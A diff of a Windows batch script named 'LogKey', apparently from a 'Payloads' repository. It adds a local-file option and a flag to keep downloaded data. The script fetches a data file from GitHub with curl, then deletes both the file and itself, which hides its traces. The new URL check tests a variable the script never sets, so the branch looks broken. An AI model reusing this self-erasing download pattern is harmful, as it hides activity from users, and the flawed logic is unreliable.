@@ -3,7 +3,7 @@ title PLs: LogKey
 
 :: Config variables
 set "debug=0"
-set "dataURL=raw.githubusercontent.com/Jed556/Payloads/main/LogKey/data.logkey"
+set "dataURL=https://raw.githubusercontent.com/Jed556/Payloads/main/LogKey/data.logkey"
 set "fileName="
 set "idLength=8"
 
@@ -24,9 +24,14 @@ if NOT [%4]==[] (
     set "fileName=%4"
 )
 
+if NOT [%5]==[] (
+    set "preserveData=%5"
+)
+
 if "%fileName%"=="" (
     for %%i in ("%dataURL%") do set "fileName=%%~nxi"
 )
+
 
 :: Art
 cls
@@ -42,8 +47,14 @@ echo. [0;34m"|     [1;36m|__/ [0;36m/_________________/   [0m               
 
 :: Get data from url
 echo.
-echo Reading data from server...[1m
-curl -Lo %fileName% %dataURL%
+if /I "!url:~0,4!"=="http" (
+    echo Reading data from server...[1m
+    curl -Lo %fileName% %dataURL%
+) else (
+    echo Reading data from local file...
+    copy %dataURL% %fileName% > nul
+    echo [0;32mCopied [1;32m%dataURL%[0;32m to [1;32m%fileName%
+)
 setlocal EnableDelayedExpansion EnableExtensions
 set "data="
 for /f "delims=" %%i in (data.logkey) do (
@@ -91,8 +102,13 @@ if "%debug%"=="1" (
 :End
 echo.
 echo Done.
+if "%preserveData%"=="1" (
+    echo [1;33mData won't be deleted...[0m
+    goto :Exit
+)
 del /Q /F %fileName%
 
+:Exit
 echo Exiting...
 timeout /t 2 /nobreak > nul
 del /Q /F "%~f0" & exit
